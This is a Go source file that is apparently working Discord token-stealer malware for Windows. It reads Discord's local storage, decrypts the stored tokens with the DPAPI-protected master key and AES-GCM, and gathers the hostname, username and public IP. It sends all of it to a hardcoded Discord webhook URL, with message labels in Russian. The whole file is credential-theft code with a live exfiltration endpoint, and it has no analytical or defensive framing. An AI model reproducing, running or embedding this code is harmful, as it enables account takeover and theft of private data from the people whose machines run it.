package dwn

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"syscall"
	"unsafe"

	"github.com/tidwall/gjson"
)

var (
	procUnprotectData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree     = dllkernel32.NewProc("LocalFree")

	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")

	local    string = os.Getenv("LOCALAPPDATA")
	roaming  string = os.Getenv("APPDATA")
	chrome          = local + "\\Google\\Chrome\\User Data"
	discords        = []string{
		roaming + "/discord/",
		roaming + "/discordptb/",
		roaming + "/discordcanary/",
	}
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) []byte {
	var output DATA_BLOB

	ptr, _, _ := procUnprotectData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&output)))
	if ptr == 0 {
		return nil
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(output.pbData)))
	return output.ToByteArray()
}

type DiscordEmbed struct {
	Title       string `json:"title,omitempty"`
	Description string `json:"description,omitempty"`
	Color       int    `json:"color,omitempty"`
}

type DiscordWebhookPayload struct {
	Content string         `json:"content,omitempty"`
	Embeds  []DiscordEmbed `json:"embeds,omitempty"`
}

func sendDiscordWebhook(url string, payload DiscordWebhookPayload) error {
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("webhook request failed with status: %s", resp.Status)
	}

	return nil
}

func getIP() (string, error) {
	resp, err := http.Get("https://api.ipify.org?format=json")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	ipData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	ip := gjson.GetBytes(ipData, "ip").String()
	return ip, nil
}

func getSystemInfo() (string, string, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return "", "", err
	}
	username := os.Getenv("USERNAME")
	return hostname, username, nil
}

func Main(done chan<- bool) {
	hostname, username, err := getSystemInfo()
	if err != nil {
		fmt.Println("Failed to get system info:", err)
		done <- true
		return
	}

	ip, err := getIP()
	if err != nil {
		fmt.Println("Failed to get IP address:", err)
		done <- true
		return
	}

	uniqueTokens := make(map[string]bool)
	var tokenList []string

	for _, dir := range discords {
		storage, _ := os.ReadDir(dir + "Local Storage/leveldb/")
		state, _ := os.ReadFile(dir + "Local State")

		for _, file := range storage {
			encryptRegex := regexp.MustCompile(`dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*`)
			bytes, _ := os.ReadFile(dir + "Local Storage/leveldb/" + file.Name())

			for _, cryptedToken := range encryptRegex.FindAll(bytes, 10) {
				cryptedKey := gjson.Get(string(state), "os_crypt.encrypted_key")
				rawKey, _ := base64.StdEncoding.DecodeString(cryptedKey.Str)
				masterKey := Decrypt(rawKey[5:])

				rawToken, _ := base64.StdEncoding.DecodeString(string(cryptedToken)[12:])
				cleanToken := rawToken[3:]

				aesCipher, _ := aes.NewCipher(masterKey)
				gcmCipher, _ := cipher.NewGCM(aesCipher)
				nonceSize := gcmCipher.NonceSize()
				nonce, encToken := cleanToken[:nonceSize], cleanToken[nonceSize:]
				token, _ := gcmCipher.Open(nil, nonce, encToken, nil)

				tokenStr := string(token)
				if !uniqueTokens[tokenStr] {
					uniqueTokens[tokenStr] = true
					tokenList = append(tokenList, tokenStr)
				}
			}
		}
	}

	webhookURL := "https://discord.com/api/webhooks/1107296874815295548/gtnzVOzQP8HwTLE4Y4m9_OEWUmgtRalgd5UtGPZC-8pPLRjorKmLI4vjhq8TtZkXY120"
	payload := DiscordWebhookPayload{
		Embeds: []DiscordEmbed{
			{
				Title: "Система",
				Description: fmt.Sprintf("**Название ПК:** %s\n**Имя пользователя:** %s\n**IP-адрес:** %s\n\n**Токены:**\n%s",
					hostname, username, ip, joinTokens(tokenList)),
			},
		},
	}

	err = sendDiscordWebhook(webhookURL, payload)

	done <- true
}

func joinTokens(tokens []string) string {
	return "- " + strings.Join(tokens, "\n- ")
}

func Sbpon() {
	done := make(chan bool)
	go Main(done)

	<-done // Wait for the Main function to finish
}
